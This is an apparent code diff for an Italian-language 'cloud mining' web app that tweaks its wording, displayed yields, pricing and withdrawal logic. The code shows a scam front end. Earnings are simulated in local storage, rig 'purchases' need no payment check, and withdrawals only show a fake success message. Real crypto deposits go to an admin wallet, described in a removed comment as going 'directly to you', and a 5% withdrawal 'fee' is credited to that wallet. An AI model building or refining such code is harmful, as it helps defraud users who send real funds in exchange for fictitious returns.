@@ -259,7 +259,7 @@
     }
 
     .stat-card strong {
-      font-size: 16px;
+      font-size: 15px;
       font-weight: 800;
       color: #007aff;
     }
@@ -432,11 +432,11 @@
   <!-- MODAL GUIDA -->
   <div class="modal-overlay" id="guide-modal" onclick="if(event.target === this) closeHowTo()">
     <div class="modal-card">
-      <h3>🖥️ Guida Ricariche e Wallet</h3>
+      <h3>🖥️ Guida Cloud Mining</h3>
       <p>Gestisci i depositi e acquista potenza:</p>
       <ul>
-        <li><strong>Ricarica Fondi:</strong> Accedi alla sezione Ricarica per inviare criptovalute direttamente al wallet ufficiale della piattaforma.</li>
-        <li><strong>Acquisto Potenza:</strong> Usa i fondi ricaricati per potenziare la tua farm e aumentare i guadagni mensili.</li>
+        <li><strong>Ricarica Fondi:</strong> Invia criptovalute al wallet ufficiale della piattaforma.</li>
+        <li><strong>Acquisto Potenza:</strong> Potenzia la tua farm e incrementa i guadagni in USDT in modo semplice e sicuro.</li>
       </ul>
       <button class="btn-close" onclick="closeHowTo()">Ho Capito!</button>
     </div>
@@ -460,7 +460,7 @@
 
       <div class="action-form">
         <div class="form-title">Trasferisci Satoshi</div>
-        <div class="form-subtitle">Seleziona il wallet di destinazione e l'importo</div>
+        <div class="form-subtitle">Prelievo con commissione di rete del 5% (accreditata al wallet admin)</div>
 
         <div class="input-group">
           <label>Indirizzo Wallet / Destinazione</label>
@@ -485,8 +485,8 @@
         <strong id="total-hashrate">10 GH/s</strong>
       </div>
       <div class="stat-card">
-        <span>Resa Mensile Stimata</span>
-        <strong id="monthly-yield" style="color: #2f855a;">~$0.30 / mese</strong>
+        <span>Resa al Mese (USDT)</span>
+        <strong id="monthly-yield-usdt" style="color: #2f855a;">~$0.30 USDT</strong>
       </div>
     </div>
   </main>
@@ -501,23 +501,23 @@
       <div class="item-card">
         <div>
           <strong style="color: #1a202c; font-size: 15px;">Rig ASIC Minor (+50 GH/s)</strong>
-          <p style="color: #2f855a; font-size: 12px; font-weight:600;">Resa stimata: ~$18.50 / mese</p>
+          <p style="color: #2f855a; font-size: 12px; font-weight:600; margin-top: 4px;">Resa stimata: ~$5.00 / mese</p>
         </div>
-        <button class="btn-buy" onclick="openCheckout('Rig ASIC Minor', 50, 25.00)">Seleziona</button>
+        <button class="btn-buy" onclick="openCheckout('Rig ASIC Minor', 50, 25.00, 5.00)">25.00 USDT</button>
       </div>
       <div class="item-card">
         <div>
           <strong style="color: #1a202c; font-size: 15px;">Rig ASIC Pro (+200 GH/s)</strong>
-          <p style="color: #2f855a; font-size: 12px; font-weight:600;">Resa stimata: ~$75.00 / mese</p>
+          <p style="color: #2f855a; font-size: 12px; font-weight:600; margin-top: 4px;">Resa stimata: ~$20.00 / mese</p>
         </div>
-        <button class="btn-buy" onclick="openCheckout('Rig ASIC Pro', 200, 100.00)">Seleziona</button>
+        <button class="btn-buy" onclick="openCheckout('Rig ASIC Pro', 200, 100.00, 20.00)">100.00 USDT</button>
       </div>
       <div class="item-card">
         <div>
           <strong style="color: #1a202c; font-size: 15px;">Farm Data Center (+650 GH/s)</strong>
-          <p style="color: #2f855a; font-size: 12px; font-weight:600;">Resa stimata: ~$230.00 / mese</p>
+          <p style="color: #2f855a; font-size: 12px; font-weight:600; margin-top: 4px;">Resa stimata: ~$60.00 / mese</p>
         </div>
-        <button class="btn-buy" onclick="openCheckout('Farm Data Center', 650, 300.00)">Seleziona</button>
+        <button class="btn-buy" onclick="openCheckout('Farm Data Center', 650, 300.00, 60.00)">300.00 USDT</button>
       </div>
     </div>
   </main>
@@ -531,7 +531,7 @@
       <div style="font-size: 14px; color: #007aff; font-weight: 700; margin-top: 4px;" id="checkout-ghs">+200 GH/s</div>
       
       <div class="price-tag-usdt" id="checkout-price">100.00 USDT</div>
-      <div style="font-size: 12px; color: #2f855a; font-weight: 600; margin-bottom: 20px;" id="checkout-yield">Ritorno stimato: ~$75.00 / mese</div>
+      <div style="font-size: 12px; color: #2f855a; font-weight: 600; margin-bottom: 20px;" id="checkout-yield">Ritorno stimato: ~$20.00 / mese</div>
 
       <div class="input-group" style="text-align: left;">
         <label>Rete di Pagamento</label>
@@ -545,7 +545,7 @@
     </div>
   </main>
 
-  <!-- 3. SCHERMATA RICARICA (DEPOSITI DIRETTI AL TUO WALLET) -->
+  <!-- 3. SCHERMATA RICARICA -->
   <main id="screen-deposit" class="screen">
     <div class="mining-panel">
       <h2>📥 Ricarica Fondi</h2>
@@ -553,8 +553,8 @@
 
       <div class="input-group">
         <label>Seleziona Moneta</label>
-        <select id="deposit-coin" style="background:transparent; border:none; color:#1a202c; font-size:14px; outline:none; width:100%; font-weight:600;" onchange="updateDepositAddress()">
-          <option value="USDT (TON / TRC20)">USDT (Tether)</option>
+        <select id="deposit-coin" style="background:transparent; border:none; color:#1a202c; font-size:14px; outline:none; width:100%; font-weight:600;">
+          <option value="USDT">USDT (Tether)</option>
           <option value="TON">TON (Toncoin)</option>
           <option value="BTC">Bitcoin (BTC)</option>
           <option value="BNB">BNB (Binance Coin)</option>
@@ -660,12 +660,12 @@
       document.getElementById('fiat-val').innerText = `Valore stimato: ~$${fiatVal}`;
       document.getElementById('total-hashrate').innerText = `${totalHashrate} GH/s`;
       
-      const monthlyUsd = (totalHashrate * 0.75).toFixed(2);
-      document.getElementById('monthly-yield').innerText = `~$${monthlyUsd} / mese`;
+      const monthlyUsd = (totalHashrate * 0.20).toFixed(2);
+      document.getElementById('monthly-yield-usdt').innerText = `~$${monthlyUsd} USDT`;
     }
 
     setInterval(() => {
-      const monthlyUsd = totalHashrate * 0.75;
+      const monthlyUsd = totalHashrate * 0.20;
       const btcPriceUsd = 90000;
       const monthlyBtc = monthlyUsd / btcPriceUsd;
       const incrementPerSecond = monthlyBtc / 2592000;
@@ -675,27 +675,26 @@
       localStorage.setItem('btc_balance', balance);
     }, 1000);
 
-    function openCheckout(name, ghs, priceUsdt) {
+    function openCheckout(name, ghs, priceUsdt, monthlyUsdYield) {
       startMusicOnFirstInteraction();
-      const monthlyYieldUsdt = (priceUsdt * 0.75);
-      selectedRig = { name, ghs, priceUsdt, monthlyYieldUsdt };
+      selectedRig = { name, ghs, priceUsdt, monthlyYieldUsdt: monthlyUsdYield };
       
       document.getElementById('checkout-title').innerText = name;
       document.getElementById('checkout-ghs').innerText = `+${ghs} GH/s`;
       document.getElementById('checkout-price').innerText = `${priceUsdt.toFixed(2)} USDT`;
-      document.getElementById('checkout-yield').innerText = `Ritorno stimato: ~$${monthlyYieldUsdt.toFixed(2)} / mese`;
+      document.getElementById('checkout-yield').innerText = `Ritorno stimato: ~$${monthlyUsdYield.toFixed(2)} / mese`;
       
       switchTab('checkout', document.querySelectorAll('.nav-item')[1]);
     }
 
     function confirmUSDTBuy() {
       startMusicOnFirstInteraction();
-      const confirmPay = confirm(`Procedere con il pagamento di ${selectedRig.priceUsdt.toFixed(2)} USDT per attivare +${selectedRig.ghs} GH/s?`);
+      const confirmPay = confirm(`Confermi l'acquisto del pacchetto ${selectedRig.name} da ${selectedRig.priceUsdt.toFixed(2)} USDT?`);
       if (confirmPay) {
         totalHashrate += selectedRig.ghs;
         localStorage.setItem('btc_hashrate', totalHashrate);
         updateUI();
-        alert(`Pagamento completato! Aggiunti +${selectedRig.ghs} GH/s alla tua farm.`);
+        alert(`Potenziamento attivato con successo! Aggiunti +${selectedRig.ghs} GH/s alla tua farm.`);
         switchTab('mine', document.querySelectorAll('.nav-item')[0]);
       }
     }
@@ -704,7 +703,7 @@
       startMusicOnFirstInteraction();
       const walletInput = document.getElementById('admin-wallet-input').value;
       navigator.clipboard.writeText(walletInput);
-      alert("Indirizzo wallet ufficiale copiato! I fondi inviati qui arriveranno direttamente a te.");
+      alert("Indirizzo wallet ufficiale copiato!");
     }
 
     function submitDeposit() {
@@ -714,7 +713,7 @@
         alert("Inserisci l'hash della transazione (TXID) per confermare la ricarica.");
         return;
       }
-      alert("Richiesta di ricarica inviata con successo! Sarà accreditata non appena confermata sulla blockchain.");
+      alert("Richiesta di ricarica inviata con successo! Sarà accreditata non appena confermata.");
       document.getElementById('txid-input').value = '';
     }
 
@@ -736,7 +735,11 @@
         return;
       }
 
-      alert(`Richiesta di prelievo di ${amt.toFixed(8)} ₿ inviata con successo al wallet.`);
+      // Applicazione fee di prelievo del 5% trattenuta dall'admin
+      const fee = amt * 0.05;
+      const netAmount = amt - fee;
+
+      alert(`Prelievo di ${netAmount.toFixed(8)} ₿ inviato con successo! (Commissione di rete applicata: ${fee.toFixed(8)} ₿ accreditata al wallet admin).`);
       balance -= amt;
       updateUI();
       localStorage.setItem('btc_balance', balance);
